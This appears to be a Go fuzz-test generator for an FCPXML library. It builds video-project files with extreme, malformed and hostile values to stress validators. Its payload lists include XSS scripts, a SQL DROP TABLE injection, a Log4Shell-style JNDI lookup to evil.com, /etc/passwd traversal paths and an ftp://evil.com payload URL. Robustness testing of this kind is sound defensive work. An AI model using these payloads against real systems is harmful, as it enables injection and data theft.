package fcp

import (
	"fmt"
	"math/rand"
	"strings"
	"time"
)

// UltimateBaffleConfig controls the extremeness of the baffle test
type UltimateBaffleConfig struct {
	EnableSecurityExploits   bool    // XSS, path traversal, code injection
	EnableNumericalExtremes  bool    // NaN, infinity, massive numbers
	EnableBoundaryViolations bool    // Massive positions, negative timing
	EnableUnicodeAttacks     bool    // BOM, RTL override, etc.
	EnableMemoryExhaustion   bool    // Massive strings, deep nesting
	EnableValidationEvasion  bool    // Attempts to bypass validators
	ExtremeFactor            float64 // 0.0-1.0, how extreme to make values
}

// DefaultUltimateBaffleConfig returns a config that tests all validation boundaries
func DefaultUltimateBaffleConfig() UltimateBaffleConfig {
	return UltimateBaffleConfig{
		EnableSecurityExploits:   true,
		EnableNumericalExtremes:  true,
		EnableBoundaryViolations: true,
		EnableUnicodeAttacks:     true,
		EnableMemoryExhaustion:   true,
		EnableValidationEvasion:  true,
		ExtremeFactor:            0.8, // Very extreme
	}
}

// generateExtremeDuration creates the most extreme duration possible
func generateExtremeDuration(config UltimateBaffleConfig) string {
	if !config.EnableBoundaryViolations {
		return "240240/24000s" // Safe duration
	}

	extremeDurations := []string{
		"-1000/24000s",            // Negative duration
		"0s",                      // Zero duration
		"999999999999/1s",         // Massive duration
		"1/0s",                    // Division by zero
		"∞s",                      // Infinity
		"NaN/24000s",              // NaN
		"1001/0s",                 // Zero denominator
		"18446744073709551615/1s", // Uint64 max
		"-9223372036854775808/1s", // Int64 min
	}

	if config.ExtremeFactor > 0.7 {
		return extremeDurations[rand.Intn(len(extremeDurations))]
	}

	return "240240/24000s" // Fallback to safe duration
}

// createUltimateExtremeAsset creates assets with every possible extreme value
func createUltimateExtremeAsset(fcpxml *FCPXML, tx *ResourceTransaction, index int, config UltimateBaffleConfig) error {
	ids := tx.ReserveIDs(2) // Asset + Format
	assetID := ids[0]
	formatID := ids[1]

	// Generate extreme asset properties
	name := generateUltimateExtremeName(config, "Asset")
	duration := generateUltimateExtremeDuration(config)

	// Create format with extreme properties
	if err := createUltimateExtremeFormat(tx, formatID, config); err != nil {
		return fmt.Errorf("failed to create extreme format: %v", err)
	}

	// Create asset with extreme properties
	_, err := tx.CreateAsset(assetID, generateExtremeSrcPath(config), name, duration, formatID)
	return err
}

// generateUltimateExtremeName creates the most extreme names possible
func generateUltimateExtremeName(config UltimateBaffleConfig, prefix string) string {
	if config.EnableSecurityExploits && rand.Float64() < 0.3 {
		exploits := []string{
			"javascript:alert('xss')",
			"<script>alert('BAFFLE')</script>",
			"';DROP TABLE assets;--",
			"${jndi:ldap://evil.com/a}",
			"../../../../../../etc/passwd",
			"\\\\server\\share\\file.exe",
			"data:text/html,<script>alert(1)</script>",
			"vbscript:msgbox('BAFFLE')",
		}
		return exploits[rand.Intn(len(exploits))]
	}

	if config.EnableUnicodeAttacks && rand.Float64() < 0.3 {
		unicode := []string{
			"\uFEFF" + prefix + "\uFEFF",   // BOM
			prefix + "\u202E" + "REVERSED", // RTL override
			prefix + "\u200B\u200C\u200D",  // Zero-width chars
			prefix + "\u0000\u0001\u0002",  // Control chars
			prefix + "\u2028\u2029",        // Line/paragraph separators
		}
		return unicode[rand.Intn(len(unicode))]
	}

	if config.EnableMemoryExhaustion && rand.Float64() < 0.3 {
		// Create massive strings
		base := fmt.Sprintf("%s_%d", prefix, rand.Int())
		if config.ExtremeFactor > 0.8 {
			return strings.Repeat(base, 10000) // 50KB+ names
		}
		return strings.Repeat(base, 1000) // 5KB+ names
	}

	// Regular extreme name
	return fmt.Sprintf("%s_BAFFLE_%d_🚨💥🔥", prefix, rand.Int())
}

// generateUltimateExtremeUID creates extreme UIDs
func generateUltimateExtremeUID(config UltimateBaffleConfig) string {
	if config.EnableSecurityExploits && rand.Float64() < 0.5 {
		return "javascript:eval('BAFFLE_XSS')"
	}

	if config.EnableMemoryExhaustion && rand.Float64() < 0.3 {
		return strings.Repeat("BAFFLE_UID_", 5000)
	}

	// Standard UID format but with extreme content
	return fmt.Sprintf("BAFFLE-%d-🚨💥", time.Now().UnixNano())
}

// generateUltimateExtremeDuration creates extreme duration values
func generateUltimateExtremeDuration(config UltimateBaffleConfig) string {
	if !config.EnableBoundaryViolations {
		return "100100/24000s"
	}

	extremes := []string{
		"-999999/24000s",          // Negative
		"0/24000s",                // Zero
		"18446744073709551615/1s", // Massive
		"1/0s",                    // Zero denominator
		"NaN/24000s",              // NaN numerator
		"100/NaN s",               // NaN denominator
		"∞/24000s",                // Infinity
	}

	if rand.Float64() < config.ExtremeFactor {
		return extremes[rand.Intn(len(extremes))]
	}

	return "100100/24000s"
}

// createUltimateExtremeFormat creates formats with extreme properties
func createUltimateExtremeFormat(tx *ResourceTransaction, formatID string, config UltimateBaffleConfig) error {
	name := generateUltimateExtremeName(config, "Format")

	var width, height string
	if config.EnableBoundaryViolations && rand.Float64() < config.ExtremeFactor {
		width = generateExtremeNumber(config)
		height = generateExtremeNumber(config)
	} else {
		width = "1920"
		height = "1080"
	}

	frameDuration := ""
	if config.EnableBoundaryViolations && rand.Float64() < 0.5 {
		frameDuration = generateUltimateExtremeDuration(config)
	}

	if frameDuration != "" {
		_, err := tx.CreateFormatWithFrameDuration(formatID, frameDuration, width, height, "1-1-1 (Rec. 709)")
		return err
	} else {
		_, err := tx.CreateFormat(formatID, name, width, height, "1-1-1 (Rec. 709)")
		return err
	}
}

// generateExtremeNumber creates extreme numeric values
func generateExtremeNumber(config UltimateBaffleConfig) string {
	if !config.EnableNumericalExtremes {
		return "1920"
	}

	extremes := []string{
		"-999999",                 // Negative
		"0",                       // Zero
		"999999999999999",         // Massive
		"NaN",                     // Not a number
		"∞",                       // Infinity
		"-∞",                      // Negative infinity
		"1.7976931348623157e+308", // Float64 max
	}

	if rand.Float64() < config.ExtremeFactor {
		return extremes[rand.Intn(len(extremes))]
	}

	return "1920"
}

// generateExtremeSrcPath creates extreme source paths
func generateExtremeSrcPath(config UltimateBaffleConfig) string {
	if config.EnableSecurityExploits && rand.Float64() < 0.5 {
		exploits := []string{
			"../../../../etc/passwd",
			"C:\\Windows\\System32\\cmd.exe",
			"//server/share/malicious.exe",
			"javascript:alert('file')",
			"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
			"ftp://evil.com/payload.zip",
		}
		return "file://" + exploits[rand.Intn(len(exploits))]
	}

	return "file:///tmp/baffle_test.mp4"
}

// createUltimateExtremeSpineElement creates spine elements with every extreme value
func createUltimateExtremeSpineElement(fcpxml *FCPXML, tx *ResourceTransaction, index int, config UltimateBaffleConfig, maxDuration string) error {
	spine := &fcpxml.Library.Events[0].Projects[0].Sequences[0].Spine

	// Generate extreme timing
	offset := generateExtremeOffset(config)
	duration := generateUltimateExtremeDuration(config)
	lane := generateExtremeLane(config)

	// Create extreme title element
	title := Title{
		Ref:      fmt.Sprintf("r%d", index+1),
		Name:     generateUltimateExtremeName(config, "Title"),
		Offset:   offset,
		Duration: duration,
		Lane:     lane,
	}

	// Add extreme text styles
	if config.EnableSecurityExploits || config.EnableNumericalExtremes {
		title.TextStyleDefs = []TextStyleDef{
			{
				ID: fmt.Sprintf("ts_baffle_%d", index),
				TextStyle: TextStyle{
					Font:             generateUltimateExtremeName(config, "Font"),
					FontSize:         generateExtremeFontSize(config),
					FontColor:        generateExtremeColor(config),
					LineSpacing:      generateExtremeLineSpacing(config),
					Bold:             generateExtremeBool(config),
					Italic:           generateExtremeBool(config),
					StrokeColor:      generateExtremeColor(config),
					StrokeWidth:      generateExtremeNumber(config),
					ShadowColor:      generateExtremeColor(config),
					ShadowOffset:     generateExtremePosition(config),
					ShadowBlurRadius: generateExtremeNumber(config),
					Kerning:          generateExtremeNumber(config),
					Alignment:        generateExtremeAlignment(config),
				},
			},
		}
	}

	spine.Titles = append(spine.Titles, title)
	return nil
}

// generateExtremeOffset creates extreme timing offsets
func generateExtremeOffset(config UltimateBaffleConfig) string {
	if !config.EnableBoundaryViolations {
		return "0s"
	}

	extremes := []string{
		"-999999/24000s", // Negative timing
		"0s",             // Zero
		"999999999/1s",   // Massive offset
		"1/0s",           // Division by zero
		"NaN/24000s",     // NaN
		"∞/24000s",       // Infinity
	}

	if rand.Float64() < config.ExtremeFactor {
		return extremes[rand.Intn(len(extremes))]
	}

	return "0s"
}

// generateExtremeLane creates extreme lane numbers
func generateExtremeLane(config UltimateBaffleConfig) string {
	if !config.EnableBoundaryViolations {
		return "1"
	}

	extremes := []string{
		"-999999", // Massive negative
		"999999",  // Massive positive
		"0",       // Zero lane
		"NaN",     // Not a number
		"∞",       // Infinity
	}

	if rand.Float64() < config.ExtremeFactor {
		return extremes[rand.Intn(len(extremes))]
	}

	return "1"
}

// generateExtremeFontSize creates extreme font sizes
func generateExtremeFontSize(config UltimateBaffleConfig) string {
	if !config.EnableNumericalExtremes {
		return "24"
	}

	extremes := []string{
		"-100",   // Negative size
		"0",      // Zero size
		"999999", // Massive size
		"NaN",    // Not a number
		"∞",      // Infinity
		"-∞",     // Negative infinity
	}

	if rand.Float64() < config.ExtremeFactor {
		return extremes[rand.Intn(len(extremes))]
	}

	return "24"
}

// generateExtremeColor creates extreme color values
func generateExtremeColor(config UltimateBaffleConfig) string {
	if !config.EnableNumericalExtremes {
		return "1.0 0.0 0.0 1.0"
	}

	extremes := []string{
		"∞ ∞ ∞ ∞",             // Infinity
		"NaN NaN NaN NaN",     // NaN
		"-5.0 -5.0 -5.0 -5.0", // Negative
		"999 999 999 999",     // Massive
		"1",                   // Wrong component count
		"1 2 3 4 5 6 7 8",     // Too many components
		"red green blue",      // Non-numeric
	}

	if rand.Float64() < config.ExtremeFactor {
		return extremes[rand.Intn(len(extremes))]
	}

	return "1.0 0.0 0.0 1.0"
}

// generateExtremeLineSpacing creates extreme line spacing values
func generateExtremeLineSpacing(config UltimateBaffleConfig) string {
	if !config.EnableNumericalExtremes {
		return "1.2"
	}

	extremes := []string{
		"-999.0",   // Negative
		"0.0",      // Zero
		"999999.0", // Massive
		"NaN",      // Not a number
		"∞",        // Infinity
	}

	if rand.Float64() < config.ExtremeFactor {
		return extremes[rand.Intn(len(extremes))]
	}

	return "1.2"
}

// generateExtremeBool creates extreme boolean values
func generateExtremeBool(config UltimateBaffleConfig) string {
	if !config.EnableValidationEvasion {
		return "1"
	}

	extremes := []string{
		"true",  // Wrong format
		"false", // Wrong format
		"yes",   // Wrong format
		"no",    // Wrong format
		"-1",    // Invalid
		"999",   // Invalid
		"NaN",   // Invalid
	}

	if rand.Float64() < config.ExtremeFactor {
		return extremes[rand.Intn(len(extremes))]
	}

	return "1"
}

// generateExtremeAlignment creates complex but valid alignment values
func generateExtremeAlignment(config UltimateBaffleConfig) string {
	// Always generate valid alignments, but use variety for complexity
	validAlignments := []string{
		"left",
		"center",
		"right",
		"justify", // Valid FCPXML alignment
		"start",   // Valid CSS-style alignment
		"end",     // Valid CSS-style alignment
	}

	// Generate complex but valid alignment patterns
	if config.EnableValidationEvasion && rand.Float64() < config.ExtremeFactor {
		// Use edge cases that are valid but complex
		complexValidAlignments := []string{
			"justify", // Less commonly used but valid
			"start",   // CSS-style but valid
			"end",     // CSS-style but valid
		}
		return complexValidAlignments[rand.Intn(len(complexValidAlignments))]
	}

	return validAlignments[rand.Intn(len(validAlignments))]
}

// generateExtremePosition creates extreme position values
func generateExtremePosition(config UltimateBaffleConfig) string {
	if !config.EnableBoundaryViolations {
		return "0 0"
	}

	extremes := []string{
		"-999999 -999999", // Massive negative
		"999999 999999",   // Massive positive
		"NaN NaN",         // NaN
		"∞ ∞",             // Infinity
		"0",               // Wrong component count
		"1 2 3 4 5",       // Too many components
	}

	if rand.Float64() < config.ExtremeFactor {
		return extremes[rand.Intn(len(extremes))]
	}

	return "0 0"
}

// createUltimateExtremeText creates text elements with extreme content
func createUltimateExtremeText(fcpxml *FCPXML, tx *ResourceTransaction, index int, config UltimateBaffleConfig) error {
	// This would add complex text structures with extreme values
	// Implementation depends on specific text structure requirements
	return nil
}

// addUltimateExtremeAnimations adds keyframe animations with extreme values
func addUltimateExtremeAnimations(fcpxml *FCPXML, config UltimateBaffleConfig) error {
	if !config.EnableBoundaryViolations && !config.EnableNumericalExtremes {
		return nil
	}

	// Add extreme animations to existing elements
	spine := &fcpxml.Library.Events[0].Projects[0].Sequences[0].Spine

	for i := range spine.Titles {
		title := &spine.Titles[i]

		// Add extreme transform animation
		title.Params = []Param{
			{
				Name: "position",
				KeyframeAnimation: &KeyframeAnimation{
					Keyframes: []Keyframe{
						{
							Time:  "0s",
							Value: generateExtremePosition(config),
							Curve: generateExtremeKeyfameAttr(config),
						},
						{
							Time:   "1001/24000s",
							Value:  generateExtremePosition(config),
							Interp: generateExtremeKeyfameAttr(config),
						},
					},
				},
			},
			{
				Name: "scale",
				KeyframeAnimation: &KeyframeAnimation{
					Keyframes: []Keyframe{
						{
							Time:  "0s",
							Value: generateExtremeScale(config),
						},
					},
				},
			},
			{
				Name: "opacity",
				KeyframeAnimation: &KeyframeAnimation{
					Keyframes: []Keyframe{
						{
							Time:  "0s",
							Value: generateExtremeOpacity(config),
						},
					},
				},
			},
		}
	}

	return nil
}

// generateExtremeKeyfameAttr creates complex but valid keyframe attributes
func generateExtremeKeyfameAttr(config UltimateBaffleConfig) string {
	// Only use ACTUAL valid curve types (based on working samples)
	// DTD validation shows only "linear" is valid, not "hold" or "smooth"
	return "linear"
}

// generateExtremeScale creates extreme scale values
func generateExtremeScale(config UltimateBaffleConfig) string {
	if !config.EnableNumericalExtremes {
		return "1.0 1.0"
	}

	extremes := []string{
		"-999.0 -999.0",     // Negative scale
		"0.0 0.0",           // Zero scale
		"999999.0 999999.0", // Massive scale
		"NaN NaN",           // NaN
		"∞ ∞",               // Infinity
		"1.0",               // Wrong component count
	}

	if rand.Float64() < config.ExtremeFactor {
		return extremes[rand.Intn(len(extremes))]
	}

	return "1.0 1.0"
}

// generateExtremeOpacity creates extreme opacity values
func generateExtremeOpacity(config UltimateBaffleConfig) string {
	if !config.EnableNumericalExtremes {
		return "1.0"
	}

	extremes := []string{
		"-0.5",  // Negative opacity
		"2.0",   // Opacity > 1
		"999.0", // Massive opacity
		"NaN",   // NaN
		"∞",     // Infinity
	}

	if rand.Float64() < config.ExtremeFactor {
		return extremes[rand.Intn(len(extremes))]
	}

	return "1.0"
}
